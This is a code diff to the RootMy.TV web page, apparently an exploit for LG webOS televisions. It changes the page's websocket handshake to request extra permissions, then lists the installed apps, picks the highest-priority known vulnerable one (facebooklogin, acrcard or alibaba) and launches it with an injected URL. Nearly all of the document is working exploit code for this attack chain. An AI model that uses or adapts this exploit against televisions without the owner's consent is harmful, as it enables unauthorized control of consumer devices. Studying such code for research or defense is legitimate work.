@@ -15,7 +15,7 @@
 
 <body>
   <header>
-    <h1>RootMy.TV</h1>
+    <h1>RootMy.TV<small> 2.0</small></h1>
   </header>
   <hr>
   <section class="content-center">
@@ -154,37 +154,82 @@
                 "localizedAppNames": {
                   "": "RootMyTV",
                 },
-                permissions: ["LAUNCH"],
+                permissions: ["LAUNCH", "READ_INSTALLED_APPS"],
               },
             }
           };
           conn.send(JSON.stringify(handshake));
         };
 
+        const pendingRequests = {};
+        function request(uri, payload, callback) {
+          const id = String(Date.now());
+          conn.send(JSON.stringify({
+            id: id,
+            type: "request",
+            uri: uri,
+            payload: payload,
+          }));
+          pendingRequests[id] = callback;
+        }
+
         conn.onmessage = function (evt) {
           const msg = JSON.parse(evt.data);
 
           if (msg.type === 'registered') {
-            log('2. Registered - opening webpage...');
-            conn.send(JSON.stringify({
-              id: 'launch_req',
-              type: "request",
-              uri: "ssap://system.launcher/launch",
-              payload: {
-                id: "com.webos.app.facebooklogin",
-                params: {
-                  server: url.replace('http://', '').replace('https://', '') + "#",
+            log('2. Registered - looking for vulnerable apps...');
+            request('ssap://com.webos.applicationManager/listApps', {}, function(msg) {
+              if (msg.type === 'response') {
+                const candidates = {
+                  "com.webos.app.facebooklogin": {
+                    priority: 1000,
+                    params: { server: url.replace('http://', '').replace('https://', '') + "#" },
+                  },
+                  "com.webos.app.acrcard": {
+                    priority: 2000,
+                    params: { contentTarget: url },
+                  },
+                  "com.webos.app.alibaba": {
+                    priority: 2500,
+                    params: { target: url },
+                  },
+                };
+
+                var bestMatch = null;
+                msg.payload.apps.forEach(function(app) {
+                  if (app.id in candidates) {
+                    log("3. Found " + app.id);
+                    if (bestMatch === null || candidates[bestMatch].priority < candidates[app.id].priority) {
+                      bestMatch = app.id;
+                    }
+                  }
+                });
+                if (!bestMatch) {
+                  log("3. No vulnerable apps found :(");
+                } else {
+                  log("3. Launching " + bestMatch + "...");
+                  request("ssap://system.launcher/launch", {
+                    id: bestMatch,
+                    params: candidates[bestMatch].params,
+                  }, function(msg) {
+                    log("3. Launch result: " + JSON.stringify(msg));
+                  });
                 }
-              },
-            }));
+             }
+            });
           } else if (msg.type === 'response') {
-            if (msg.payload.returnValue === true && msg.id === 'launch_req') {
-              log('2. Launch request finished');
+            if (pendingRequests[msg.id]) {
+              pendingRequests[msg.id](msg);
+              delete pendingRequests[msg.id];
             } else if (msg.id !== 'reg_req') {
               log('Unexpected response: ' + evt.data);
             }
           } else if (msg.type === 'error') {
             log('Unexpected message, connection prompt likely declined:\n' + evt.data);
+            if (pendingRequests[msg.id]) {
+              pendingRequests[msg.id](msg);
+              delete pendingRequests[msg.id];
+            }
           } else {
             log('Unexpected message: ' + evt.data);
           }
